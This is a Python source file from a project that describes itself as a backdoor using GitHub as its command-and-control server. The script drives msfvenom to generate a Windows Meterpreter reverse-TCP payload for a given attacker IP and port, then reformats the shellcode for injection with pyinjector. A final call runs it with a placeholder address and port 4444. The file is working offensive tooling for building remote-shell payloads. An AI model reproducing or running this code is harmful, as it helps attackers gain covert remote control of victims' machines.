"""
    This file is part of canisrufus
    Copyright (C) 2017 @maldevel
    https://github.com/maldevel/canisrufus
    
    canisrufus - A fully featured backdoor that uses Github as a C&C server

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    
    For more see the file 'LICENSE' for copying permission.
"""

__author__ = "maldevel"
__copyright__ = "Copyright (c) 2017 @maldevel"
__credits__ = ["maldevel"]
__license__ = "GPLv3"
__version__ = "1.0"
__maintainer__ = "maldevel"

# quick script that generates the proper format for the shellcode to feed into pyinjector
# generates powershell payload  from @trustedsec pyinjector

import subprocess

def generate_powershell_shellcode(payload, ipaddr, port):
    # grab the metasploit path
    msf_path = "/usr/local/share/metasploit-framework/"
    # generate payload
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s -a x86  --platform Windows EXITFUNC=thread -f python" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # base counter
    print data

generate_powershell_shellcode("windows/meterpreter/reverse_tcp", "x.x.x.x", "4444")
